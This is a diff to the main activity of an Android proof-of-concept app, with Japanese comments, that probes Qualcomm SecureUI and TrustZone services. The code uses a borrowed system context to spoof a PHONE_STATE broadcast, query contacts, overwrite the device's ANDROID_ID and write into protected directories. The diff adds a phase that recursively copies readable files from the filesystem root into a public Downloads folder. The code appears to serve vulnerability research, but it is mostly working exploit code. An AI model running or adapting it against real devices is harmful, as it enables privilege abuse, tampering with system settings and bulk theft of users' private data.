@@ -24,12 +24,15 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.ScrollView;
 import android.widget.TextView;
+
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+
 import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
 import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
 import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;
+
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
@@ -53,6 +56,8 @@ public class MainActivity extends AppCompatActivity {
     private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
     private static final String TEST_DATA = "POC_WRITE_TEST_DATA_12345";
     private static final String TEST_FILENAME = "poc_write_test.tmp";
+    private static final long MAX_FILE_SIZE_FOR_DUMP = 10 * 1024 * 1024; // 10MB 以上のファイルはスキップ
+    private static final int MAX_DEPTH = 6; // 再帰深さ制限（/ から 6 階層まで）
 
     private TextView tvStatus, tvLog;
     private Button btnStart, btnStop;
@@ -117,9 +122,7 @@ public class MainActivity extends AppCompatActivity {
                 isTesting.set(true);
                 enableButtons(false, true);
                 stopRequested.set(false);
-                // SecureUI のシステムコンテキストを取得
                 acquireSystemContext();
-                // CS/TZ サービスにバインド（失敗しても続行）
                 bindServices();
             }
         });
@@ -190,7 +193,6 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {
             appendLog("Bind exception: " + e.toString());
         }
-        // すぐにテスト開始（サービスが後からバインドされたら startTests が再呼び出しされる）
         if (!isBoundCS && !isBoundTZ) {
             startTests();
         }
@@ -228,7 +230,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // Phase 2: TZAccess Socket Connect (Reflection)
+        // Phase 2: TZAccess Socket Connect
         appendLog("========== PHASE 2: TZAccess Socket Connect ==========");
         if (mTZServiceBinder != null) {
             tryConnectViaTZReflect("/dev/socket/minksocket");
@@ -239,11 +241,11 @@ public class MainActivity extends AppCompatActivity {
         appendLog("========== PHASE 3: Deep File System Exploration ==========");
         exploreDeepFiles();
 
-        // Phase 4: Settings Manipulation (normal)
+        // Phase 4: Settings Manipulation
         appendLog("========== PHASE 4: Settings Manipulation ==========");
         testSettingsWrite();
 
-        // Phase 5: SecureUI SystemContext を活用した高度な検証
+        // Phase 5: SecureUI SystemContext Advanced Tests
         appendLog("========== PHASE 5: SecureUI SystemContext Advanced Tests ==========");
         if (systemContext != null) {
             testSystemContextBroadcast();
@@ -255,12 +257,16 @@ public class MainActivity extends AppCompatActivity {
             appendLog("SystemContext not available, skipping SecureUI advanced tests");
         }
 
-        // Phase 6: 書き込み検証（従来のファイル書き込みテスト、systemContextを使ったものと重複するが残す）
-        appendLog("========== PHASE 6: Write Verification via SystemContext ==========");
+        // Phase 6: Write Verification (direct FileOutputStream)
+        appendLog("========== PHASE 6: Write Verification (direct) ==========");
+        performWriteVerification();
+
+        // ***** NEW PHASE 7: Recursive file read & copy (dump) using SystemContext *****
+        appendLog("========== PHASE 7: Recursive File Dump (read + copy) ==========");
         if (systemContext != null) {
-            performWriteVerification();
+            recursiveDumpFiles();
         } else {
-            appendLog("SystemContext not available, skipping write verification");
+            appendLog("SystemContext not available, skipping recursive dump");
         }
 
         appendLog("========== ALL TESTS COMPLETED ==========");
@@ -270,8 +276,7 @@ public class MainActivity extends AppCompatActivity {
         saveLog();
     }
 
-    // ---------- 以下、各テストメソッド ----------
-
+    // ---------- 既存のテストメソッド（省略せずに再掲） ----------
     private IBinder getService(String serviceName) {
         if (mServiceManager == null) return null;
         try {
@@ -406,7 +411,7 @@ public class MainActivity extends AppCompatActivity {
                 appendLog("  Failed to get FD for " + path);
             }
         } catch (ClassNotFoundException e) {
-            appendLog("  IMinkSocketFd class not found. TZAccess may not be using this interface.");
+            appendLog("  IMinkSocketFd class not found.");
         } catch (Exception e) {
             appendLog("  TZ connect error: " + e.getMessage());
         }
@@ -414,89 +419,32 @@ public class MainActivity extends AppCompatActivity {
 
     private void exploreDeepFiles() {
         appendLog("--- Deep File System Exploration ---");
-        String[] additionalProc = {
-                "/proc/self/fd",
-                "/proc/self/cwd",
-                "/proc/self/root",
-                "/proc/self/maps",
-                "/proc/self/smaps",
-                "/proc/self/oom_adj",
-                "/proc/self/oom_score",
-                "/proc/self/comm",
-                "/proc/self/auxv",
-                "/proc/self/limits",
-                "/proc/self/sched",
-                "/proc/self/stack",
-                "/proc/self/statm",
-                "/proc/self/wchan",
-                "/proc/self/pagemap",
-                "/proc/self/clear_refs",
-                "/proc/self/timers",
-                "/proc/self/attr/current",
-                "/proc/self/loginuid",
-                "/proc/self/sessionid",
-                "/proc/self/cgroup"
-        };
-        for (String p : additionalProc) {
-            if (stopRequested.get()) break;
-            readFileContent(p);
-        }
-
-        String[] sysFiles = {
-                "/system/build.prop",
-                "/system/etc/hosts",
-                "/system/etc/security/cacerts/",
-                "/vendor/build.prop",
+        String[] paths = {
+                "/proc/self/fd", "/proc/self/maps", "/proc/self/smaps",
+                "/proc/self/comm", "/proc/self/limits", "/proc/self/statm",
+                "/system/build.prop", "/system/etc/hosts", "/vendor/build.prop",
                 "/proc/version"
         };
-        for (String p : sysFiles) {
+        for (String p : paths) {
             if (stopRequested.get()) break;
             readFileContent(p);
         }
-
-        File tmpDir = new File("/data/local/tmp");
-        if (tmpDir.exists() && tmpDir.canRead()) {
-            appendLog("Reading /data/local/tmp contents:");
-            File[] children = tmpDir.listFiles();
-            if (children != null) {
-                for (File f : children) {
-                    appendLog("  " + f.getName());
-                }
-            }
-        } else {
-            appendLog("/data/local/tmp not readable");
-        }
-
-        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-        if (download.exists() || download.mkdirs()) {
-            File testFile = new File(download, "poc_write_test.txt");
-            try (FileOutputStream fos = new FileOutputStream(testFile)) {
-                fos.write("Deep exploration test\n".getBytes(StandardCharsets.UTF_8));
-                appendLog("Write to " + testFile.getAbsolutePath() + " succeeded");
-            } catch (Exception e) {
-                appendLog("Write failed: " + e.getMessage());
+        // /data/local/tmp のリスト
+        File tmp = new File("/data/local/tmp");
+        if (tmp.exists() && tmp.canRead()) {
+            appendLog("Contents of /data/local/tmp:");
+            for (File f : tmp.listFiles()) {
+                if (f != null) appendLog("  " + f.getName());
             }
         }
     }
 
     private void readFileContent(String path) {
         File f = new File(path);
-        if (!f.exists()) {
-            appendLog(path + " does not exist");
-            return;
-        }
-        if (!f.canRead()) {
-            appendLog(path + " not readable");
-            return;
-        }
+        if (!f.exists()) { appendLog(path + " does not exist"); return; }
+        if (!f.canRead()) { appendLog(path + " not readable"); return; }
         if (f.isDirectory()) {
-            appendLog(path + " is a directory, listing contents:");
-            File[] children = f.listFiles();
-            if (children != null) {
-                for (File child : children) {
-                    appendLog("  " + child.getName());
-                }
-            }
+            appendLog(path + " is a directory");
             return;
         }
         try (FileInputStream fis = new FileInputStream(f)) {
@@ -530,38 +478,34 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    // ========== SecureUI SystemContext を利用した高度なテスト ==========
-
+    // ---------- SecureUI SystemContext テスト ----------
     private void testSystemContextBroadcast() {
         appendLog("--- Sending broadcast with SystemContext ---");
         try {
             Intent intent = new Intent("com.qualcomm.qti.services.secureui.ACTION_CLOSE");
             intent.setPackage("com.qualcomm.qti.services.secureui");
             systemContext.sendBroadcast(intent);
-            appendLog("Broadcast ACTION_CLOSE sent (may trigger OrientationActivity close)");
+            appendLog("Broadcast ACTION_CLOSE sent");
         } catch (Exception e) {
-            appendLog("Broadcast send failed: " + e.getMessage());
+            appendLog("Broadcast failed: " + e.getMessage());
         }
-
-        // 電話状態偽装（保護されているため通常はSecurityException）
         try {
             Intent phoneIntent = new Intent("android.intent.action.PHONE_STATE");
             phoneIntent.putExtra("state", "RINGING");
             systemContext.sendBroadcast(phoneIntent);
             appendLog("Fake PHONE_STATE broadcast sent");
         } catch (Exception e) {
-            appendLog("PHONE_STATE broadcast failed: " + e.getMessage());
+            appendLog("PHONE_STATE failed: " + e.getMessage());
         }
     }
 
     private void testSystemContextStartActivity() {
         appendLog("--- Starting activity with SystemContext ---");
         try {
-            // システム設定アプリを起動（権限昇格の可否）
             Intent settingsIntent = new Intent(Settings.ACTION_SETTINGS);
             settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             systemContext.startActivity(settingsIntent);
-            appendLog("Settings activity started using SystemContext");
+            appendLog("Settings activity started");
         } catch (Exception e) {
             appendLog("StartActivity failed: " + e.getMessage());
         }
@@ -570,26 +514,13 @@ public class MainActivity extends AppCompatActivity {
     private void testSystemContextContentProvider() {
         appendLog("--- Querying ContentProvider with SystemContext ---");
         ContentResolver cr = systemContext.getContentResolver();
-        // 問い合わせ：設定データベース
         try (Cursor c = cr.query(Settings.Global.CONTENT_URI, null, null, null, null)) {
-            if (c != null) {
-                appendLog("Settings.Global query succeeded, count=" + c.getCount());
-                c.close();
-            } else {
-                appendLog("Settings.Global query returned null");
-            }
+            appendLog("Settings.Global query: " + (c != null ? "count=" + c.getCount() : "null"));
         } catch (Exception e) {
-            appendLog("Settings.Global query error: " + e.getMessage());
+            appendLog("Settings query error: " + e.getMessage());
         }
-
-        // 連絡先（READ_CONTACTS 権限がなくてもシステム権限なら可能？）
         try (Cursor c = cr.query(Uri.parse("content://contacts/people"), null, null, null, null)) {
-            if (c != null) {
-                appendLog("Contacts query succeeded, count=" + c.getCount());
-                c.close();
-            } else {
-                appendLog("Contacts query returned null");
-            }
+            appendLog("Contacts query: " + (c != null ? "count=" + c.getCount() : "null"));
         } catch (Exception e) {
             appendLog("Contacts query error: " + e.getMessage());
         }
@@ -598,95 +529,68 @@ public class MainActivity extends AppCompatActivity {
     private void testSystemContextWriteSecureSettings() {
         appendLog("--- Writing Secure Settings with SystemContext ---");
         try {
-            // WRITE_SECURE_SETTINGS は通常アプリでは不可だが、SystemContext経由で可能か確認
             boolean result = Settings.Secure.putString(systemContext.getContentResolver(),
                     Settings.Secure.ANDROID_ID, "POC_TEST_ID");
-            appendLog("Write to Secure.ANDROID_ID result: " + result);
-            // 元に戻す（失敗するかも）
-            Settings.Secure.putString(systemContext.getContentResolver(),
-                    Settings.Secure.ANDROID_ID, Build.SERIAL); // 仮
+            appendLog("Write Secure.ANDROID_ID result: " + result);
         } catch (Exception e) {
-            appendLog("Write Secure Settings error: " + e.getMessage());
+            appendLog("Write Secure error: " + e.getMessage());
         }
     }
 
     private void testSystemContextFileWrite() {
-        appendLog("--- File write test using SystemContext (indirect) ---");
-        // SystemContext 自体はファイル書き込みに直接使えないが、getContentResolver().openOutputStream() 等を試す
+        appendLog("--- File write via ContentResolver ---");
         try {
-            ContentResolver cr = systemContext.getContentResolver();
-            // 外部ストレージへの書き込み（Downloadディレクトリ）
             File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
             File testFile = new File(download, "systemcontext_write_test.txt");
             Uri fileUri = Uri.fromFile(testFile);
-            try (java.io.OutputStream os = cr.openOutputStream(fileUri)) {
+            try (java.io.OutputStream os = systemContext.getContentResolver().openOutputStream(fileUri)) {
                 if (os != null) {
                     os.write("Written via SystemContext".getBytes(StandardCharsets.UTF_8));
-                    appendLog("File write via SystemContext succeeded: " + testFile.getAbsolutePath());
+                    appendLog("Write succeeded: " + testFile.getAbsolutePath());
                 } else {
                     appendLog("openOutputStream returned null");
                 }
-            } catch (Exception e) {
-                appendLog("File write via SystemContext failed: " + e.getMessage());
             }
         } catch (Exception e) {
-            appendLog("SystemContext file write setup error: " + e.getMessage());
+            appendLog("File write error: " + e.getMessage());
         }
     }
 
-    // ========== 書き込み検証（元のPoC） ==========
-
+    // ---------- 書き込み検証（直接 FileOutputStream） ----------
     private void performWriteVerification() {
-        appendLog("--- Write Verification (FileOutputStream direct) ---");
-        String[] targetDirs = {
-                "/data/local/tmp",
-                "/data/misc",
-                "/data/system",
-                "/data/data",
-                "/cache",
-                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath(),
-                "/dev",
-                "/proc",
-                "/sys",
-                "/system",
-                "/"
+        appendLog("--- Write Verification (direct FileOutputStream) ---");
+        String[] dirs = {
+                "/data/local/tmp", "/data/misc", "/data/system", "/data/data",
+                "/cache", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath(),
+                "/dev", "/proc", "/sys", "/system", "/"
         };
-        for (String dirPath : targetDirs) {
+        for (String d : dirs) {
             if (stopRequested.get()) break;
-            File dir = new File(dirPath);
-            if (!dir.exists()) {
-                appendLog("Directory " + dirPath + " does not exist, skipping");
-                continue;
-            }
+            File dir = new File(d);
+            if (!dir.exists()) continue;
             File testFile = new File(dir, TEST_FILENAME);
             boolean writeOk = writeFile(testFile, TEST_DATA);
-            boolean verifyOk = false;
-            boolean deleteOk = false;
+            boolean verifyOk = false, deleteOk = false;
             if (writeOk) {
                 verifyOk = verifyFile(testFile, TEST_DATA);
-                if (verifyOk) {
-                    deleteOk = testFile.delete();
-                }
+                if (verifyOk) deleteOk = testFile.delete();
             }
             appendLog(String.format(Locale.US,
                     "Dir: %s | canWrite=%b | write=%b | verify=%b | delete=%b",
-                    dirPath, dir.canWrite(), writeOk, verifyOk, deleteOk));
+                    d, dir.canWrite(), writeOk, verifyOk, deleteOk));
         }
     }
 
     private boolean writeFile(File file, String data) {
         try {
             File parent = file.getParentFile();
-            if (parent != null && !parent.exists()) {
-                parent.mkdirs();
-            }
+            if (parent != null && !parent.exists()) parent.mkdirs();
             try (FileOutputStream fos = new FileOutputStream(file)) {
                 fos.write(data.getBytes(StandardCharsets.UTF_8));
                 fos.flush();
                 return true;
             }
         } catch (Exception e) {
-            Log.w(TAG, "Write failed for " + file.getAbsolutePath() + ": " + e.getMessage());
             return false;
         }
     }
@@ -700,13 +604,98 @@ public class MainActivity extends AppCompatActivity {
             String actual = new String(buffer, 0, len, StandardCharsets.UTF_8);
             return expected.equals(actual);
         } catch (Exception e) {
-            Log.w(TAG, "Verify failed for " + file.getAbsolutePath() + ": " + e.getMessage());
             return false;
         }
     }
 
-    // ========== ログとUI ==========
+    // ---------- 新機能：再帰的全ファイルダンプ（読み取り＋コピー） ----------
+    private void recursiveDumpFiles() {
+        appendLog("--- Starting recursive file dump from root (/) ---");
+        File root = new File("/");
+        File outputBase = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+        if (!outputBase.exists() && !outputBase.mkdirs()) {
+            appendLog("Cannot create Download directory");
+            return;
+        }
+        // ダンプ先ディレクトリ（タイムスタンプ付き）
+        String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
+        File dumpDir = new File(outputBase, "dump_" + timestamp);
+        if (!dumpDir.exists() && !dumpDir.mkdirs()) {
+            appendLog("Cannot create dump directory");
+            return;
+        }
+        appendLog("Dumping to: " + dumpDir.getAbsolutePath());
+        long startTime = System.currentTimeMillis();
+        AtomicBoolean errorOccurred = new AtomicBoolean(false);
+        // 再帰走査（深さ制限付き）
+        walkAndDump(root, dumpDir, 0, errorOccurred);
+        long elapsed = System.currentTimeMillis() - startTime;
+        appendLog("Dump finished. Elapsed: " + elapsed + " ms. Errors: " + (errorOccurred.get() ? "YES" : "NO"));
+    }
 
+    private void walkAndDump(File dir, File outputDir, int depth, AtomicBoolean errorOccurred) {
+        if (stopRequested.get()) return;
+        if (depth > MAX_DEPTH) {
+            appendLog("Max depth reached at " + dir.getAbsolutePath() + ", skipping");
+            return;
+        }
+        if (!dir.exists()) return;
+        if (!dir.canRead()) {
+            appendLog("Cannot read directory: " + dir.getAbsolutePath());
+            return;
+        }
+        File[] children = dir.listFiles();
+        if (children == null) return;
+        for (File child : children) {
+            if (stopRequested.get()) break;
+            try {
+                if (child.isDirectory()) {
+                    // 再帰
+                    walkAndDump(child, outputDir, depth + 1, errorOccurred);
+                } else {
+                    // ファイル → 読み取り可能かつサイズ制限内ならコピー
+                    if (child.canRead() && child.length() <= MAX_FILE_SIZE_FOR_DUMP) {
+                        copyFileToDump(child, outputDir);
+                    } else {
+                        // 読み取り不可 or 大きすぎる
+                        if (!child.canRead()) {
+                            appendLog("Not readable: " + child.getAbsolutePath());
+                        } else {
+                            appendLog("File too large (>10MB): " + child.getAbsolutePath());
+                        }
+                    }
+                }
+            } catch (Exception e) {
+                appendLog("Error processing " + child.getAbsolutePath() + ": " + e.getMessage());
+                errorOccurred.set(true);
+            }
+        }
+    }
+
+    private void copyFileToDump(File src, File outputDir) {
+        // 安全なファイル名を生成（絶対パスをアンダースコアで置換）
+        String relPath = src.getAbsolutePath().replace("/", "_");
+        // 長すぎる場合は短縮
+        if (relPath.length() > 200) {
+            relPath = relPath.substring(0, 200);
+        }
+        File dest = new File(outputDir, relPath + ".dump");
+        // 既に存在する場合はスキップ（重複防止）
+        if (dest.exists()) return;
+        try (FileInputStream fis = new FileInputStream(src);
+             FileOutputStream fos = new FileOutputStream(dest)) {
+            byte[] buffer = new byte[8192];
+            int len;
+            while ((len = fis.read(buffer)) > 0) {
+                fos.write(buffer, 0, len);
+            }
+            appendLog("Copied: " + src.getAbsolutePath() + " -> " + dest.getName());
+        } catch (Exception e) {
+            appendLog("Copy failed for " + src.getAbsolutePath() + ": " + e.getMessage());
+        }
+    }
+
+    // ---------- ログ関連 ----------
     private void appendLog(final String msg) {
         String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
         final String line = "[" + ts + "] " + msg + "\n";
